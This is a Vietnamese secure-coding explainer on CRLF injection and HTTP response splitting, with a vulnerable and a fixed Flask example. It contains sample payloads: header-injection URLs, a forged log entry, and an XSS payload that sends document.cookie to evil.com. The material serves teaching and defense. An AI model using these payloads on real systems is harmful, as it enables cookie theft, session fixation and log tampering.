# CRLF Injection

> **CWE**: CWE-93 | **Phân loại**: Injection

## Kiến thức Nền tảng

Hãy tưởng tượng giao thức HTTP giống như một bức thư được viết theo quy chuẩn nghiêm ngặt: mỗi dòng thông tin (như tiêu đề thư, người gửi, người nhận) phải được xuống dòng rõ ràng. Để báo hiệu việc xuống dòng này, trình duyệt và máy chủ sử dụng một cặp ký tự đặc biệt gọi là CRLF (viết tắt của Carriage Return và Line Feed, ký hiệu là `\r\n`). Khi nhận được bức thư, máy chủ cứ thấy CRLF là biết cần bắt đầu một dòng mới, và khi thấy hai cặp CRLF liên tiếp (`\r\n\r\n`), nó hiểu rằng phần tiêu đề đã hết và phần nội dung chính của bức thư bắt đầu. Tương tự, các hệ thống ghi nhật ký (log) cũng dùng ký tự xuống dòng để phân biệt các sự kiện khác nhau.

```http
# Normal HTTP response structure
HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
Set-Cookie: session=abc123\r\n
\r\n
<html>...</html>
```

Trong web application, redirect thường lấy URL từ user input:

```python
# Normal redirect implementation in Flask
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def do_redirect():
    # User-supplied destination used in Location header
    dest = request.args.get('url', '/')
    return redirect(dest)
```

## Mô tả lỗ hổng

Lỗ hổng CRLF Injection xuất hiện khi ứng dụng cho phép người dùng điền thông tin vào tiêu đề thư nhưng lại không kiểm tra xem họ có lén chèn thêm các ký tự xuống dòng `\r\n` hay không. Việc này giống như kẻ xấu cố tình viết chữ "Xuống dòng" và tự tạo ra một dòng mới trong bức thư chính thức của bạn. Bằng cách tự tạo ra các dòng mới này, kẻ tấn công có thể chèn thêm các tiêu đề giả mạo (như Set-Cookie để cố định phiên đăng nhập), hoặc thậm chí tạo hẳn một trang web giả mạo nằm ngay trong phần nội dung phản hồi (HTTP Response Splitting). Điều này rất nguy hiểm vì nó có thể đánh lừa trình duyệt thực thi mã JavaScript độc hại (XSS), làm sai lệch nhật ký hệ thống để che giấu vết tích, hoặc đầu độc bộ nhớ đệm (cache poisoning) của những người dùng khác.

## Cơ chế tấn công

**HTTP Response Splitting** — Attacker chèn CRLF vào tham số redirect để inject header mới:

```
# Attack URL — injecting Set-Cookie header via CRLF
https://victim.com/redirect?url=%0d%0aSet-Cookie:%20admin=true

# The server generates this malformed response:
HTTP/1.1 302 Found\r\n
Location: \r\n
Set-Cookie: admin=true\r\n        <-- Injected header!
\r\n
```

**Log Injection** — Attacker chèn newline để tạo log entry giả:

```
# Malicious username input for log injection
username = "admin\nINFO: Login successful for user admin from 10.0.0.1"

# Log file now shows fake entry:
# WARN: Failed login for user admin
# INFO: Login successful for user admin from 10.0.0.1
```

**Full Response Splitting** — Chèn cả body HTML mới chứa JavaScript:

```
# Injecting a complete fake response with XSS payload
url=%0d%0a%0d%0a<script>document.location='https://evil.com/?c='+document.cookie</script>
```

## Biện pháp phòng thủ

- **Tóm tắt**: Loại bỏ hoặc mã hóa các ký tự xuống dòng (CRLF) trước khi đưa vào tiêu đề phản hồi hoặc ghi nhật ký hệ thống.
- **Các bước chi tiết**:
  - Loại bỏ hoặc encode ký tự CRLF: Strip tất cả `\r` và `\n` khỏi input trước khi sử dụng trong header hoặc log.
  - Sử dụng framework hiện đại: Hầu hết framework mới (Django, Express, Spring) tự động reject header chứa CRLF.
  - URL-encode output: Khi chèn user input vào Location header, luôn encode đúng cách.
  - Validate log input: Thay thế newline bằng ký tự an toàn hoặc encode trước khi ghi log.
  - WAF rules: Cấu hình Web Application Firewall phát hiện pattern `%0d%0a` trong request.

## Code Example

```python
# === VULNERABLE CODE ===
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/set-language')
def set_language():
    lang = request.args.get('lang', 'en')
    response = make_response("Language set")
    # DANGER: User input directly injected into header
    response.headers['X-Language'] = lang
    return response
# Attack: /set-language?lang=en%0d%0aSet-Cookie:%20admin=true


# === SECURE CODE ===
import re
from flask import Flask, request, make_response

app = Flask(__name__)

ALLOWED_LANGS = {'en', 'vi', 'fr', 'de', 'ja'}

def sanitize_header_value(value):
    # Remove all CR and LF characters to prevent CRLF injection
    return re.sub(r'[\r\n]', '', value)

@app.route('/set-language')
def set_language():
    lang = request.args.get('lang', 'en')

    # Whitelist validation — best defense
    if lang not in ALLOWED_LANGS:
        lang = 'en'

    # Defense in depth — also strip CRLF characters
    safe_lang = sanitize_header_value(lang)

    response = make_response("Language set")
    response.headers['X-Language'] = safe_lang
    return response
```

## Xem thêm

- [Web Cache Poisoning](../../08-data-integrity-failures/web-cache-poisoning/) — Lỗ hổng đầu độc bộ nhớ đệm web, thường tận dụng kỹ thuật chèn header thông qua CRLF Injection để đầu độc cache response.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/request-smuggling/advanced/response-splitting
- OWASP: https://owasp.org/www-community/vulnerabilities/CRLF_Injection
- CWE: https://cwe.mitre.org/data/definitions/93.html

## Giải thích thuật ngữ

- **CRLF**: Cặp ký tự xuống dòng (Carriage Return + Line Feed), ký hiệu là `\r\n`.
- **HTTP Response Splitting**: Cuộc tấn công chia tách phản hồi HTTP bằng cách chèn CRLF để tạo ra phản hồi giả.
- **Session Fixation**: Tấn công cố định phiên, kẻ xấu ép nạn nhân sử dụng session ID định sẵn để chiếm đoạt tài khoản sau đó.
- **Cache Poisoning**: Đầu độc bộ nhớ đệm của proxy hoặc trình duyệt để phân phối nội dung giả mạo.
- **Log Injection**: Tiêm dòng log giả mạo vào file nhật ký hệ thống nhằm che giấu hành vi hoặc đánh lừa quản trị viên.
